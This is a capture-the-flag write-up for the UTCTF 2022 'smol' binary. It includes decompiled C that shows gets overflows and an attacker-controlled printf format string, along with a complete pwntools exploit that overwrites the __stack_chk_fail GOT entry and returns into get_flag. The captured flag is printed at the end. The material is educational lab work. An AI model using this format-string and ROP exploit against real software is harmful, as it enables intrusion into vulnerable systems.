```
You can have a little overflow, as a treat

By Tristan (@trab on discord)
nc pwn.utctf.live 5004 
```

[smol](/utctf-2022/bins/smol)

![checksec of smol; no PIE but it has a canary](/utctf-2022/smol_checksec.png)

```c

undefined8 main(void)

{
  char cVar1;
  int iVar2;
  ulong uVar3;
  char *pcVar4;
  long in_FS_OFFSET;
  byte bVar5;
  char local_158 [111];
  undefined4 uStack233;
  undefined2 uStack229;
  char local_78 [104];
  long local_10;
  
  bVar5 = 0;
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  puts("What kind of data do you have?");
  gets(local_158);
  iVar2 = strcmp(local_158,"big data");
  if (iVar2 == 0) {
    uVar3 = 0xffffffffffffffff;
    pcVar4 = (char *)((long)&uStack233 + 1);
    do {
      if (uVar3 == 0) break;
      uVar3 = uVar3 - 1;
      cVar1 = *pcVar4;
      pcVar4 = pcVar4 + (ulong)bVar5 * -2 + 1;
    } while (cVar1 != '\0');
    *(undefined4 *)((long)&uStack233 + ~uVar3) = 0x30322025;
    *(undefined2 *)((long)&uStack229 + ~uVar3) = 0x73;
  }
  else {
    iVar2 = strcmp(local_158,"smol data");
    if (iVar2 == 0) {
      uVar3 = 0xffffffffffffffff;
      pcVar4 = (char *)((long)&uStack233 + 1);
      do {
        if (uVar3 == 0) break;
        uVar3 = uVar3 - 1;
        cVar1 = *pcVar4;
        pcVar4 = pcVar4 + (ulong)bVar5 * -2 + 1;
      } while (cVar1 != '\0');
      *(undefined4 *)((long)&uStack233 + ~uVar3) = 0x73352025;
      *(undefined *)((long)&uStack229 + ~uVar3) = 0;
    }
    else {
      puts("Error");
    }
  }
  puts("Give me your data");
  gets(local_78);
  printf((char *)((long)&uStack233 + 1),local_78);
  putchar(10);
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The big takeaway I get from this is that it's vulnerable as fuck. Multiple gets calls, and a sus printf. A naive overflow can't exploit this because of the canary but we also have a printf which uses a stack string as the format string. This is unimaginably suspicious to me because honestly no good reason why it shouldn't be an unwritable constant string. A little investigation on how it gets populated (in two conditional blocks, branched based on strcmp) shows that if neither of those strcmp calls match then the stack string is uninitialized. 

At this point the general structure of the attack is clear

1. Overflow the "what kind of data" prompt to fill the stack string with whatever we want and not match either big or smol data. 
2. Rewrite the GOT entry for `__stack_chk_fail` to a ret gadget
3. ROP to get_flag. 

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./smol_patched")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r)
    else:
        r = remote("pwn.utctf.live", 5004)
    return r


def main():
    r = conn()
    payload = fmtstr_payload(20, {exe.got['__stack_chk_fail']: next(exe.search(b'\xc3'))})
    r.sendline(b"A" * 112 + payload)
    r.sendline(b"A" * 120 + p64(exe.symbols['get_flag']))

    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()
```


utflag{just_a_little_salami15983350}